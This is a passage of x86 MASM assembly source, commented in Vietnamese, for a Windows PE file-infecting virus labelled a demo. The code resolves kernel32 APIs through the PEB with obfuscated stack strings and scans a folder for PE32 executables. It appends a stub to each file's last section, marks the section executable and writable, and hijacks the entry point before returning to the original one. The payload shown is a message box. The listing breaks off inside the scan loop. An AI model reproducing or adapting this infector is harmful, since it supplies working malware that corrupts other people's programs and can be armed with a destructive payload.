;           ml /c /Zd /coff fileInfect.asm
;               link fileInfect.obj kernel32.lib user32.lib shlwapi.lib /subsystem:console /entry:start
; Run:                  fileInfect.exe

.386
.MODEL flat, stdcall
OPTION CASEMAP:NONE

INCLUDE windows.inc
INCLUDE kernel32.inc
INCLUDE user32.inc
INCLUDE shlwapi.inc
INCLUDELIB kernel32.lib
INCLUDELIB user32.lib
INCLUDELIB shlwapi.lib

; =============================================
; SECTION DATA - KHAI BÁO BIẾN TOÀN CỤC
; =============================================
.data
    ; === BIẾN HỆ THỐNG & THÔNG BÁO ===
    mutex_name          db "FileInfectorMutex",0
    msg_caption         db "Infection Alert",0
    msg_content         db "File Infector Active!",0
    test_success_msg    db "Test Success: File Read OK!",0
    test_failed_msg     db "Test Failed!",0
    debug_msg           db ">> Found first file", 0Dh, 0Ah, 0


    ; === ĐƯỜNG DẪN TÌM KIẾM ===
    search_path         db "L:\test\*.*", 0
    base_path           db "L:\test\", 0
    system_path         db "C:\Windows",0
    kernel32_name       db "kernel32.dll",0
    user32_name         db "user32.dll",0
    
    ; === BIẾN CONSOLE OUTPUT ===
    newline             db 0Dh, 0Ah, 0
    tab_space           db "    ", 0
    infected_marker     db " -> [INFECTED]", 0
    scanning_msg        db "Scanning directory for PE files...", 0Dh, 0Ah, 0
    file_count_msg      db " files processed.", 0Dh, 0Ah, 0
    infected_count_msg  db " files infected.", 0Dh, 0Ah, 0
    starting_msg        db "File Infector Started - PE Infection Demo", 0Dh, 0Ah, 0
    completed_msg       db "Infection process completed.", 0Dh, 0Ah, 0
    MessageBoxA_str     db "MessageBoxA",0

    ; === BIẾN LƯU API ADDRESSES ===
    pCreateFileA        dd 0
    pReadFile           dd 0
    pWriteFile          dd 0
    pSetFilePointer     dd 0
    pCloseHandle        dd 0
    pGetFileSize        dd 0
    pVirtualAlloc       dd 0
    pVirtualFree        dd 0
    pMessageBoxA        dd 0
    pFindFirstFileA     dd 0
    pFindNextFileA      dd 0
    pGetModuleFileNameA dd 0
    plstrcpyA           dd 0
    plstrcatA           dd 0
    plstrcmpA           dd 0
    plstrstrA           dd 0
    plstrlenA           dd 0
    pGetProcAddress     dd 0
    pLoadLibraryA       dd 0
    pCreateMutexA       dd 0
    pGetLastError       dd 0
    pExitProcess        dd 0
    pGetStdHandle       dd 0
    pWriteConsoleA      dd 0
    
    ; === BIẾN KERNEL32 ===
    hKernel32           dd 0
    
    ; === BIẾN PE INFECTION ===
    virus_base          dd 0
    infection_marker    dd 0A5B6C7Dh
    original_entry_point dd 0
    new_entry_point     dd 0
    section_alignment   dd 0
    file_alignment      dd 0
    image_base          dd 0
    last_section_header dd 0
    
    ; === BIẾN CONSOLE ===
    hConsoleOutput      dd 0
    bytesWritten        dd 0
    file_count          dd 0
    infected_count      dd 0

; =============================================
; SECTION CODE - CÁC HÀM CHỨC NĂNG
; =============================================
.code

; =============================================
; HÀM CONSOLE: In chuỗi ra console
; =============================================
PrintConsole PROC text:DWORD
    Push Ebp
    Mov Ebp, Esp
    Pushad

    ; Tính độ dài chuỗi
    Push text
    Call [plstrlenA]
    Mov Ecx, Eax       ; ECX = length

    ; Thử in bằng WriteConsoleA
    Push 0
    Push OFFSET bytesWritten
    Push Ecx
    Push text
    Push [hConsoleOutput]
    Call [pWriteConsoleA]
    Test Eax, Eax
    Jnz @@done         ; Nếu thành công → xong luôn

    ; Nếu thất bại, fallback sang WriteFile
    Push 0
    Push OFFSET bytesWritten
    Push Ecx
    Push text
    Push [hConsoleOutput]
    Call [pWriteFile]

@@done:
    Popad
    Mov Esp, Ebp
    Pop Ebp
    Ret 4
PrintConsole ENDP


; =============================================
; HÀM CONSOLE: In số nguyên ra console
; =============================================
PrintNumber PROC number:DWORD
    Local buffer[16]:BYTE
    
    Pushad
    
    ; Chuyển số thành chuỗi
    Lea Edi, buffer
    Mov Eax, number
    Mov Ecx, 10
    Xor Ebx, Ebx
    
    ; Đếm số chữ số
    Mov Esi, Eax
    Xor Edx, Edx
@@CountDigits:
    Inc Ebx
    Div Ecx
    Test Eax, Eax
    Jnz @@CountDigits
    
    ; Chuyển thành chuỗi
    Mov Eax, Esi
    Mov Byte Ptr [Edi + Ebx], 0
@@ConvertLoop:
    Dec Ebx
    Xor Edx, Edx
    Div Ecx
    Add Dl, '0'
    Mov [Edi + Ebx], Dl
    Test Eax, Eax
    Jnz @@ConvertLoop
    
    ; In ra console
    Lea Eax, buffer
    Push Eax
    Call PrintConsole
    
    Popad
    Ret 4
PrintNumber ENDP

; =============================================
; HÀM TIỆN ÍCH: Delta Offset - Tự định vị mã
; =============================================
GetVirusBase PROC
    call delta_offset
delta_offset:
    pop eax
    sub eax, offset delta_offset
    ret
GetVirusBase ENDP

; =============================================
; HÀM TIỆN ÍCH: Tính độ dài chuỗi
; =============================================
StrLen PROC str_ptr:DWORD
    Push Esi
    Mov Esi, str_ptr
    Xor Eax, Eax
@@Loop:
    Cmp Byte Ptr [Esi], 0
    Je @@Done
    Inc Esi
    Inc Eax
    Jmp @@Loop
@@Done:
    Pop Esi
    Ret 4
StrLen ENDP

; =============================================
; HÀM BẢO MẬT: Kiểm tra file hệ thống
; =============================================
IsSystemFile PROC filename:DWORD
    Push Ebp
    Mov Ebp, Esp
    Push Esi
    Push Edi
    
    Mov Esi, filename
    
    ; Kiểm tra phần mở rộng .sys
    Push Esi
    Call StrLen
    Mov Ecx, Eax
    Add Esi, Ecx
    Sub Esi, 4                      ; Lùi về 4 ký tự cuối
    
    Cmp DWORD PTR [Esi], 'sys.'     ; ".sys" ngược
    Je @@IsSystem
    
    ; Kiểm tra thư mục Windows
    Push OFFSET system_path
    Push filename
    Call [plstrstrA]
    Test Eax, Eax
    Jnz @@IsSystem
    
    ; Kiểm tra file kernel32.dll và user32.dll
    Push OFFSET kernel32_name
    Push filename
    Call [plstrstrA]
    Test Eax, Eax
    Jnz @@IsSystem
    
    Push OFFSET user32_name
    Push filename
    Call [plstrstrA]
    Test Eax, Eax
    Jnz @@IsSystem
    
    ; Không phải file hệ thống
    Xor Eax, Eax
    Jmp @@ExitProc
    
@@IsSystem:
    Mov Eax, 1
    
@@ExitProc:
    Pop Edi
    Pop Esi
    Mov Esp, Ebp
    Pop Ebp
    Ret 4
IsSystemFile ENDP

; =============================================
; HÀM PE ANALYSIS: Tìm section header cuối (VirtualAddress max)
; =============================================
FindLastSectionHeader PROC pFileBuffer:DWORD
    Push Ebp
    Mov Ebp, Esp
    Push Ebx
    Push Esi
    Push Edi
    
    Mov Esi, pFileBuffer
    
    ; Kiểm tra DOS header
    Cmp WORD PTR [Esi], 'ZM'
    Jne @@NotFound
    
    ; Lấy PE header offset
    Mov Eax, DWORD PTR [Esi + 3Ch]
    Add Esi, Eax
    
    ; Kiểm tra PE signature
    Cmp DWORD PTR [Esi], 00004550h  ; 'PE\0\0'
    Jne @@NotFound
    
    ; Lấy số lượng sections
    Movzx Ecx, WORD PTR [Esi + 6]   ; NumberOfSections
    Test Ecx, Ecx
    Jz @@NotFound
    
    ; Tính toán vị trí section table
    Lea Edi, [Esi + 24]             ; Sau PE signature + COFF header
    Movzx Eax, WORD PTR [Esi + 20]  ; SizeOfOptionalHeader
    Add Edi, Eax
    
    ; TÌM SECTION CÓ VIRTUAL ADDRESS MAX
    Xor Ebx, Ebx                    ; Ebx = max VirtualAddress
    Xor Edx, Edx                    ; Edx = pointer to section with max VA
    Mov Ecx, DWORD PTR [Esi + 6]    ; NumberOfSections
    And Ecx, 0FFFFh
    
@@FindLastSection:
    Push Ecx
    Mov Eax, [Edi + 12]             ; VirtualAddress
    Cmp Eax, Ebx
    Jbe @@NextSection
    Mov Ebx, Eax                    ; Update max VirtualAddress
    Mov Edx, Edi                    ; Update pointer to last section
    
@@NextSection:
    Add Edi, 40                     ; Next section header
    Pop Ecx
    Loop @@FindLastSection
    
    Test Edx, Edx
    Jz @@NotFound
    Mov Eax, Edx                    ; Return pointer to last section
    Jmp @@ExitProc
    
@@NotFound:
    Xor Eax, Eax
    
@@ExitProc:
    Pop Edi
    Pop Esi
    Pop Ebx
    Mov Esp, Ebp
    Pop Ebp
    Ret 4
FindLastSectionHeader ENDP

; =============================================
; HÀM PE INFECTION: Mở rộng section cuối
; =============================================
ExtendLastSection PROC pFileBuffer:DWORD, virus_size:DWORD
    Push Ebp
    Mov Ebp, Esp
    Push Ebx
    Push Esi
    Push Edi
    
    Mov Esi, pFileBuffer
    
     ; Tìm section header có VirtualAddress lớn nhất
    Push Esi
    Call FindLastSectionHeader
    Test Eax, Eax
    Jz @@Failed
    Mov Edi, Eax                    ; Edi = Last section header
    Mov [last_section_header], Edi  ; Lưu lại

    
    ; Lấy thông tin section cuối
    Mov Eax, DWORD PTR [Edi + 8]    ; VirtualSize hiện tại
    Mov Ebx, DWORD PTR [Edi + 16]   ; SizeOfRawData hiện tại
    
    ; === MỞ RỘNG VIRTUAL SIZE (trong bộ nhớ) ===
    Add Eax, virus_size
    Mov Ecx, [section_alignment]
    Dec Ecx
    Add Eax, Ecx
    Not Ecx
    And Eax, Ecx
    Mov DWORD PTR [Edi + 8], Eax    ; Cập nhật VirtualSize
    
    ; === MỞ RỘNG RAW SIZE (trên đĩa) ===
    Mov Eax, Ebx                    ; RawSize hiện tại
    Add Eax, virus_size
    Mov Ecx, [file_alignment]
    Dec Ecx
    Add Eax, Ecx
    Not Ecx
    And Eax, Ecx
    Mov DWORD PTR [Edi + 16], Eax   ; Cập nhật SizeOfRawData
    
    ; === CẬP NHẬT SIZEOFIMAGE TRONG OPTIONAL HEADER ===
    ; Tìm Optional Header
    Mov Esi, [pFileBuffer]
    Mov Eax, DWORD PTR [Esi + 3Ch]  ; PE header offset
    Add Esi, Eax                    ; Esi = PE header
    Lea Esi, [Esi + 24]             ; Esi = Optional Header
    
    ; Tính SizeOfImage mới
    Mov Eax, [Edi + 12]             ; VirtualAddress của section cuối
    Add Eax, [Edi + 8]              ; + VirtualSize mới
    Mov Ecx, [section_alignment]
    Dec Ecx
    Add Eax, Ecx
    Not Ecx
    And Eax, Ecx
    Mov DWORD PTR [Esi + 56], Eax   ; Cập nhật SizeOfImage (offset 56)
    
     ; === TÍNH VỊ TRÍ MÃ VIRUS ===
    Mov Eax, DWORD PTR [Edi + 20]   ; PointerToRawData
    Add Eax, Ebx                    ; + SizeOfRawData cũ (chưa align)
    Mov [new_entry_point], Eax      ; Virus sẽ được ghi ở cuối section hiện tại
    
    ; === ĐẶT QUYỀN CHO SECTION (RWE) ===
    Or DWORD PTR [Edi + 36], 0E0000020h  ; EXECUTE | READ | WRITE
    
    Mov Eax, 1
    Jmp @@ExitProc
    
@@Failed:
    Xor Eax, Eax
    
@@ExitProc:
    Pop Edi
    Pop Esi
    Pop Ebx
    Mov Esp, Ebp
    Pop Ebp
    Ret 8
ExtendLastSection ENDP

; =============================================
; HÀM PE ANALYSIS: Kiểm tra file PE hợp lệ
; =============================================
IsPE32Target PROC filename:DWORD
    Local hFile:DWORD, bytesRead:DWORD, fileBuffer[512]:BYTE
    
    Push Ebx
    Push Edi
    Push Esi
    
    ; Mở file với quyền đọc và ghi
    Push 0
    Push FILE_ATTRIBUTE_NORMAL
    Push OPEN_EXISTING
    Push 0
    Push FILE_SHARE_READ OR FILE_SHARE_WRITE
    Push GENERIC_READ OR GENERIC_WRITE
    Push filename
    Call [pCreateFileA]

    Cmp Eax, INVALID_HANDLE_VALUE
    je @@InvalidTarget

    Mov hFile, Eax                  ; Lưu file handle
    
    ; Đọc IMAGE_DOS_HEADER
    Push 0
    Lea Edx, bytesRead
    Push Edx
    Push 64
    Lea Ecx, fileBuffer
    Push Ecx
    Push hFile
    Call [pReadFile]
    Test Eax, Eax
    Jz @@InvalidAndClose

    ; Kiểm tra chữ ký 'MZ'
    Cmp WORD PTR fileBuffer, 'ZM'
    Jne @@InvalidAndClose

    ; Lấy vị trí PE Header
    Mov Esi, DWORD PTR fileBuffer[3Ch]

    ; Di chuyển con trỏ file tới PE Header
    Push FILE_BEGIN
    Push 0
    Push Esi
    Push hFile
    Call [pSetFilePointer]

    ; Đọc IMAGE_NT_HEADERS
    Push 0
    Lea Edx, bytesRead
    Push Edx
    Push 256
    Lea Ecx, fileBuffer
    Push Ecx
    Push hFile
    Call [pReadFile]
    Test Eax, Eax
    Jz @@InvalidAndClose

    ; Kiểm tra chữ ký 'PE\0\0'
    Cmp DWORD PTR fileBuffer, 00004550h
    Jne @@InvalidAndClose

    ; Kiểm tra Machine Type (I386)
    Cmp WORD PTR fileBuffer[4], 014Ch
    Jne @@InvalidAndClose

    ; Kiểm tra Infection Marker
    Mov Eax, DWORD PTR fileBuffer[8] ; TimeDateStamp
    Cmp Eax, [infection_marker]
    Je @@InvalidAndClose

    ; === LƯU THÔNG TIN PE QUAN TRỌNG ===
    ; Lưu Original Entry Point
    Mov Eax, DWORD PTR fileBuffer[40] ; AddressOfEntryPoint
    Mov [original_entry_point], Eax
    
    ; Lưu ImageBase
    Mov Eax, DWORD PTR fileBuffer[52] ; ImageBase
    Mov [image_base], Eax
    
    ; Lưu Section Alignment và File Alignment
    Mov Eax, DWORD PTR fileBuffer[56] ; SectionAlignment
    Mov [section_alignment], Eax
    Mov Eax, DWORD PTR fileBuffer[60] ; FileAlignment
    Mov [file_alignment], Eax

    ; Hợp lệ, giữ file mở
    Mov Eax, 1
    Mov Edx, hFile                  ; Trả về handle qua EDX
    Jmp @@ExitProc

@@InvalidAndClose:
    Push hFile
    Call [pCloseHandle]
@@InvalidTarget:
    Xor Eax, Eax
    Xor Edx, Edx

@@ExitProc:
    Pop Esi
    Pop Edi
    Pop Ebx
    Ret 4
IsPE32Target ENDP

; =============================================
; STUB MÃ VIRUS - Code sẽ được chèn vào file PE
; =============================================
virus_stub PROC
    ; === DELTA OFFSET - TỰ ĐỊNH VỊ ===
    call get_delta
get_delta:
    pop ebp
    sub ebp, offset get_delta
    
    ; === Hiển thị MessageBoxA ===
    push 0
    lea eax, [ebp + stub_caption]
    push eax
    lea eax, [ebp + stub_message]
    push eax
    push 0
    call dword ptr [ebp + pMessageBoxA_offset] 

    
    ; === RETURN TO OEP ===
    mov eax, [ebp + original_entry_point]
    add eax, [ebp + image_base]
    jmp eax
    
    ; === ĐỆM CHO ĐỦ KÍCH THƯỚC ===
    ;nop
    ;db 1000h - ($ - offset virus_stub) dup(90h)  ; NOP padding
stub_message         db "Infected!",0
stub_caption         db "PE Infected",0
align 4
pMessageBoxA_offset  dd 0
virus_stub ENDP

; =============================================
; HÀM CHÍNH: Lây nhiễm file PE
; =============================================
InfectFile PROC hFile:DWORD
    Local fileSize:DWORD, pBuffer:DWORD, bytesRead:DWORD, bytesWrittenLocal:DWORD
    
    Push Ebx
    Push Edi
    Push Esi

    Mov Esi, hFile                  ; ESI = File Handle
    
    ; == GetFileSize ==
    Push 0
    Push Esi
    Call [pGetFileSize]
    Cmp Eax, INVALID_FILE_SIZE
    Je @@TestFailed

    Mov fileSize, Eax               ; Lưu kích thước file

    ; == VirtualAlloc ==
    Push PAGE_READWRITE
    Push MEM_COMMIT
    Push Eax                        ; file size
    Push 0
    Call [pVirtualAlloc]
    Test Eax, Eax
    Jz @@TestFailed

    Mov Edi, Eax                    ; EDI = con trỏ tới buffer
    Mov pBuffer, Eax

    ; == Read file to buffer ==
    Push FILE_BEGIN 
    Push 0
    Push 0
    Push Esi
    Call [pSetFilePointer]

    Push 0
    Lea Ecx, bytesRead
    Push Ecx
    Push fileSize
    Push Edi
    Push Esi
    Call [pReadFile]
    Test Eax, Eax
    Jz @@FreeAndFail

    ; == MỞ RỘNG SECTION CUỐI ==
    Push 1000h                      ; Kích thước mã virus (4KB)
    Push Edi                        ; Buffer file
    Call ExtendLastSection
    Test Eax, Eax
    Jz @@FreeAndFail


    ; === PATCH ĐỊA CHỈ MessageBoxA TRƯỚC KHI GHI ===
    Call GetVirusBase
    Add Eax, offset virus_stub         ; EAX = địa chỉ đầu stub
    Mov Ebx, Eax                       ; Ebx = stub base trong bộ nhớ

    Mov Eax, [pMessageBoxA]            ; Lấy địa chỉ thực MessageBoxA
    Mov Dword Ptr [Ebx + (pMessageBoxA_offset - virus_stub)], Eax


    ; == GHI MÃ VIRUS VÀO FILE ==
    Push FILE_BEGIN
    Push 0
    Push [new_entry_point]          ; Vị trí mã virus
    Push Esi
    Call [pSetFilePointer]
    
    Push 0
    Lea Ecx, bytesWrittenLocal
    Push Ecx
    Push 1000h                      ; Kích thước mã virus
    Call GetVirusBase               ; Lấy địa chỉ mã virus
    Add Eax, offset virus_stub      ; Trỏ đến stub mã virus
    Push Eax
    Push Esi
    Call [pWriteFile]
    Test Eax, Eax
    Jz @@FreeAndFail
    
    ; == CẬP NHẬT PE HEADER ==
    ; Tìm PE header trong buffer
    Mov Eax, DWORD PTR [Edi + 3Ch]  ; PE header offset
    Add Eax, Edi                    ; Eax = PE header
    
    ; Cập nhật AddressOfEntryPoint trỏ đến mã virus
    Mov Ecx, [new_entry_point]
    ; Tính RVA mới: new_entry_point - file_offset + virtual_offset
    Mov Edx, [last_section_header]
    Mov Ebx, [Edx + 12]             ; VirtualAddress của section
    Sub Ecx, [Edx + 20]             ; - PointerToRawData
    Add Ecx, Ebx                    ; + VirtualAddress = RVA mới
    Mov DWORD PTR [Eax + 28h], Ecx  ; Cập nhật AddressOfEntryPoint
    
    ; Đánh dấu file đã nhiễm
    Mov Eax, [infection_marker]
    Mov DWORD PTR [Edi + 8], Eax    ; TimeDateStamp làm infection marker
    
    ; == GHI LẠI TOÀN BỘ FILE ==
    Push FILE_BEGIN
    Push 0
    Push 0
    Push Esi
    Call [pSetFilePointer]
    
    Push 0
    Lea Ecx, bytesWrittenLocal 
    Push Ecx
    Push fileSize
    Push Edi
    Push Esi
    Call [pWriteFile]
    Test Eax, Eax
    Jz @@FreeAndFail

    ; == TĂNG BỘ ĐẾM FILE NHIỄM ==
    Inc [infected_count]

    ; Giải phóng bộ nhớ
    Push MEM_RELEASE
    Push 0
    Push pBuffer
    Call [pVirtualFree]

    Mov Eax, 1
    Jmp @@Exit

@@FreeAndFail:
    Push MEM_RELEASE
    Push 0
    Push pBuffer
    Call [pVirtualFree]
@@TestFailed:
    Xor Eax, Eax

@@Exit:
    Pop Esi
    Pop Edi
    Pop Ebx
    Ret 4
InfectFile ENDP

; =============================================
; ENTRY POINT 
; =============================================
start:
    ; === DELTA OFFSET ===
    Call GetVirusBase
    Mov [virus_base], Eax

    Push Ebp
    Mov Ebp, Esp
    Sub Esp, 800H
    
    ; === GET KERNEL32 BASE ADDRESS ===
    ASSUME FS:NOTHING
    Mov Eax, FS:[30h]               ; PEB
    Mov Eax, DWORD PTR [Eax + 0Ch]  ; PEB_LDR_DATA
    Mov Eax, DWORD PTR [Eax + 14h]  ; InMemoryOrderModuleList (Flink)
    Mov Eax, DWORD PTR [Eax]        ; Entry thứ 2 (ntdll.dll)
    Mov Eax, DWORD PTR [Eax]        ; Entry thứ 3 (kernel32.dll)
    Mov Eax, DWORD PTR [Eax + 10h]  ; Base address của kernel32.dll
    Mov [hKernel32], Eax
    Mov Ebx, Eax

    ; === GETPROCADDRESS ===
    Mov Eax, DWORD PTR [Ebx + 3Ch]  ; RVA của PE signature
    Add Eax, Ebx                    ; Địa chỉ của PE signature
    Mov Eax, DWORD PTR [Eax + 78h]  ; RVA của Export Table
    Add Eax, Ebx                    ; Địa chỉ của Export Table
    
    ; Export Table
    Mov Ecx, DWORD PTR [Eax + 14h]  ; NumberOfNames
    Mov DWORD PTR [Ebp - 8], Ecx
    Mov Ecx, DWORD PTR [Eax + 1Ch]  ; AddressOfFunctions (RVA)
    Add Ecx, Ebx
    Mov DWORD PTR [Ebp - 0Ch], Ecx
    Mov Ecx, DWORD PTR [Eax + 20h]  ; AddressOfNames (RVA)
    Add Ecx, Ebx
    Mov DWORD PTR [Ebp - 10h], Ecx
    Mov Ecx, DWORD PTR [Eax + 24h]  ; AddressOfNameOrdinals (RVA)
    Add Ecx, Ebx
    Mov DWORD PTR [Ebp - 14h], Ecx

    ; Chuỗi "GetProcAddress" trên stack
    Xor Eax, Eax
    Mov Ax, 7373h                   ; "ss" + null
    Push Eax
    Push 65726464h                  
    Push 41636F72h                  
    Push 50746547h                  ; "GetProcAddress"
    Mov DWORD PTR [Ebp - 18h], Esp

    Xor Eax, Eax                    ; Index

search_GetProcAddress:
    Mov Esi, DWORD PTR [Ebp - 18h]  ; Chuỗi "GetProcAddress"
    Mov Edi, DWORD PTR [Ebp - 10h]  ; AddressOfNames
    Mov Edi, DWORD PTR [Edi + Eax * 4] ; RVA của tên hàm
    Add Edi, Ebx                    ; Địa chỉ tuyệt đối
    Mov Ecx, 15                     ; Độ dài chuỗi
    Repe Cmpsb
    Jz found_GetProcAddress
    Inc Eax
    Cmp Eax, DWORD PTR [Ebp - 8]
    Jne search_GetProcAddress
    Jmp exit_program

found_GetProcAddress:
    Mov Ecx, DWORD PTR [Ebp - 14h]  ; AddressOfNameOrdinals
    Mov Edx, DWORD PTR [Ebp - 0Ch]  ; AddressOfFunctions
    Mov Ax, WORD PTR [Ecx + Eax * 2] ; Ordinal
    And Eax, 0FFFFh
    Mov Eax, DWORD PTR [Edx + Eax * 4] ; RVA của hàm
    Add Eax, Ebx                    ; Địa chỉ tuyệt đối
    Mov Esi, Eax
    Mov [pGetProcAddress], Esi

    ; Dọn stack
    Add Esp, 10h

    ; ======= LOAD CÁC HÀM API CẦN THIẾT =======
    
    ; GetStdHandle **
    Push 0
    Push 656C646Eh
    Push 61486474h
    Push 53657447h                  ; "GetStdHandle"
    Push Esp
    Push Ebx
    Call Esi
    Mov [pGetStdHandle], Eax
    Add Esp, 10h

    ; WriteConsoleA
    Xor Ecx, Ecx
    Mov Cl, 41H                     ; 'A' 
    Push Ecx
    Push 656C6F73h              
    Push 6E6F4365h              
    Push 74697257h                  ; "WriteConsoleA"
    Push Esp
    Push Ebx
    Call Esi
    Mov [pWriteConsoleA], Eax
    Add Esp, 10h

    ; lstrlenA
    Push 0
    Push 416E656Ch
    Push 7274736Ch                  ; "lstrlenA"
    Push Esp
    Push Ebx
    Call Esi
    Mov [plstrlenA], Eax
    Add Esp, 0Ch

    ; CreateMutexA
    Push 0
    Push 41786574h
    Push 754D6574h
    Push 61657243h
    Push Esp
    Push Ebx
    Call Esi
    Mov [pCreateMutexA], Eax
    Add Esp, 10h

    ; GetLastError
    Push 0
    Push 726F7272h
    Push 45747361h
    Push 4C746547h
    Push Esp
    Push Ebx
    Call Esi
    Mov [pGetLastError], Eax
    Add Esp, 10h

    ; LoadLibraryA
    Push 0
    Push 41797261h
    Push 7262694Ch
    Push 64616F4Ch
    Push Esp
    Push Ebx
    Call Esi
    Mov [pLoadLibraryA], Eax
    Add Esp, 10h

    ; lstrstrA **
    Push 0
    Push 41727473h
    Push 7274736Ch
    Push Esp
    Push Ebx
    Call Esi
    Mov [plstrstrA], Eax
    Add Esp, 0Ch

    ; WriteFile
    Xor Ecx, Ecx
    Mov Cl, 65H
    Push Ecx
    Push 6C694665H
    Push 74697257H
    Push Esp                        ; "WriteFile"
    Push Ebx
    Call Esi
    Mov [pWriteFile], Eax
    Add Esp, 0Ch

    ; FindFirstFileA
    Xor Ecx, Ecx
    Mov Cx, 4165H                   ; "41 65 - A e"
    Push Ecx
    Push 6C694674H
    Push 73726946H
    Push 646E6946H
    Push Esp                        ; "FindFirstFileA"
    Push Ebx                        ; kernel32.dll base address
    Call Esi
    Mov [pFindFirstFileA], Eax
    Add Esp, 10h

    ; FindNextFileA
    Xor Ecx, Ecx
    Mov Cl, 41H
    Push Ecx
    Push 656C6946H
    Push 7478654EH
    Push 646E6946H
    Push Esp
    Push Ebx
    Call Esi
    Mov [pFindNextFileA], Eax
    Add Esp, 10h
    
    ; ExitProcess
    Push 61737365H                  ; "asse" sub a to "sse"
    Sub DWord Ptr [Esp + 3H], 61H
    Push 636F7250H
    Push 74697845H
    Push Esp                        ; "ExitProcess"
    Push Ebx
    Call Esi
    Mov [pExitProcess], Eax
    Add Esp, 10h
    
    ; CloseHandle
    Push 0
    Push 61656C64H
    Sub DWord Ptr [Esp + 3H], 61H
    Push 6E614865H
    Push 736F6C43H
    Push Esp
    Push Ebx
    Call Esi
    Mov [pCloseHandle], Eax
    Add Esp, 10h

    ; CreateFileA
    Push 0
    Push 6141656CH                  ; "aAel"
    Sub DWord Ptr [Esp + 3H], 61H   ; to "Ael"
    Push 69466574H
    Push 61657243H
    Push Esp
    Push Ebx
    Call Esi
    Mov [pCreateFileA], Eax
    Add Esp, 10h

    ; ReadFile
    Push 0
    Push 656C6946h
    Push 64616552h
    Push Esp
    Push Ebx
    Call Esi
    Mov [pReadFile], Eax
    Add Esp, 0Ch

    ; SetFilePointer
    Xor Ecx, Ecx
    Mov Cx, 7265H                   ; "72 65 - r e"	
    Push Ecx
    Push 746E696FH
    Push 50656C69H
    Push 46746553H
    Push Esp
    Push Ebx
    Call Esi
    Mov [pSetFilePointer], Eax
    Add Esp, 10h

    ; GetModuleFileNameA
    Xor Ecx, Ecx
    Mov Cx, 4165H
    Push Ecx
    Push 6D614E65H
    Push 6C694665H
    Push 6C75646FH
    Push 4D746547H
    Push Esp
    Push Ebx
    Call Esi
    Mov [pGetModuleFileNameA], Eax
    Add Esp, 10h

    ; lstrcmpA
    Push 0
    Push 41706D63h
    Push 7274736Ch
    Push Esp
    Push Ebx
    Call Esi
    Mov [plstrcmpA], Eax
    Add Esp, 0Ch

    ; lstrcatA
    Push 0
    Push 41746163h
    Push 7274736Ch
    Push Esp
    Push Ebx
    Call Esi
    Mov [plstrcatA], Eax
    Add Esp, 0Ch

    ; lstrcpyA
    Push 0
    Push 41797063h
    Push 7274736Ch
    Push Esp
    Push Ebx
    Call Esi
    Mov [plstrcpyA], Eax
    Add Esp, 0Ch

    ; GetFileSize
    Push 61657A69h
    Sub DWord Ptr [Esp + 3H], 61H	
    Push 53656C69h
    Push 46746547h
    Push Esp
    Push Ebx
    Call Esi
    Mov [pGetFileSize], Eax
    Add Esp, 0Ch

    ; VirtualAlloc
    Push 0
    Push 636F6C6Ch
    Push 416C6175h
    Push 74726956h
    Push Esp
    Push Ebx
    Call Esi
    Mov [pVirtualAlloc], Eax
    Add Esp, 10h

    ; VirtualFree
    Push 61656572h
    Sub DWord Ptr [Esp + 3H], 61H	
    Push 466C6175h
    Push 74726956h
    Push Esp
    Push Ebx
    Call Esi
    Mov [pVirtualFree], Eax
    Add Esp, 0Ch

    ; === KHỞI TẠO CONSOLE ===
    Push -11                     ; STD_OUTPUT_HANDLE
    Call [pGetStdHandle]
    Mov [hConsoleOutput], Eax   ; STD_OUTPUT_HANDLE = -11

    ; === HIỂN THỊ THÔNG BÁO BẮT ĐẦU ===
; Thử in trực tiếp bằng WriteFile thay vì PrintConsole
    Push 0
    Push OFFSET bytesWritten
    Push LENGTHOF starting_msg - 1  ; Độ dài chuỗi (bỏ null terminator)
    Push OFFSET starting_msg
    Push [hConsoleOutput]
    Call [pWriteFile]

    Push 0
    Push OFFSET bytesWritten  
    Push LENGTHOF scanning_msg - 1
    Push OFFSET scanning_msg
    Push [hConsoleOutput]
    Call [pWriteFile]

    ; === CHECK MUTEX - SINGLE INSTANCE ===
    Xor Eax, Eax
    Push Eax
    Push Eax
    Push OFFSET mutex_name
    Call [pCreateMutexA]
    
    Test Eax, Eax
    Jz exit_program
    
    Call [pGetLastError]
    Cmp Eax, ERROR_ALREADY_EXISTS
    Je exit_program

    ; === LOAD USER32 & MESSAGEBOX ===
    Push OFFSET user32_name
    Call [pLoadLibraryA]
    Test Eax, Eax
    Jz start_infection_phase

    ; Get MessageBoxA address
    Push OFFSET MessageBoxA_str         ; "MessageBoxA"
    Push Eax
    Call [pGetProcAddress]
    Mov [pMessageBoxA], Eax
    Test Eax, Eax
    Jz start_infection_phase

    ; Hiển thị thông báo
    Push 0
    Push OFFSET msg_caption
    Push OFFSET msg_content
    Push 0
    Call [pMessageBoxA]

    
    ; === GIAI ĐOẠN LÂY NHIỄM ===
start_infection_phase:
    ; Lấy đường dẫn file virus để tránh tự lây
    Lea Eax, [Ebp - 400h]
    Push 260
    Push Eax
    Push 0
    Call [pGetModuleFileNameA]

    ; Tìm file trong thư mục
    Lea Eax, [Ebp - 300h]           ; WIN32_FIND_DATA
    Push Eax 
    Push OFFSET search_path 
    Call PrintConsole
    Call [pFindFirstFileA]
    
    Cmp Eax, INVALID_HANDLE_VALUE
    Je show_summary

    ; Debug: file đầu tiên
    Push OFFSET debug_msg
    Call PrintConsole
    Mov DWORD PTR [Ebp - 50h], Eax  ; Lưu search handle

file_loop:
    ; Tăng bộ đếm file
    Inc [file_count]

    ; Tạo đường dẫn đầy đủ
    Lea Edi, [Ebp - 500h]
    Push OFFSET base_path
    Push Edi
    Call [plstrcpyA]
    
    Lea Eax, [Ebp - 300h + 2Ch]     ; cFileName
    Push Eax
    Push Edi 
    Call [plstrcatA]

    ; In đường dẫn file ra console
    Push Edi
    Call PrintConsole

    ; Kiểm tra file hệ thống
    Push Edi
    Call IsSystemFile
    Test Eax, Eax
    Jnz find_next_file

    ; Tránh tự lây
    Lea Eax, [Ebp - 400h]           ; Đường dẫn virus
    Push Eax
    Push Edi 
    Call [plstrcmpA]
    Test Eax, Eax 
    Jz find_next_file

    ; Kiểm tra PE32 và infection marker
    Push Edi
    Call IsPE32Target
    Test Eax, Eax 
    Jz find_next_file
    Mov DWORD PTR [Ebp - 84h], Edx  ; Lưu handle file target

    ; Lây nhiễm file
    Push DWORD PTR [Ebp - 84h]
    Call InfectFile
    Test Eax, Eax
    Jz @@skip_infected_marker

    ; In marker "INFECTED"
    Push OFFSET infected_marker
    Call PrintConsole

@@skip_infected_marker:
    ; Đóng handle
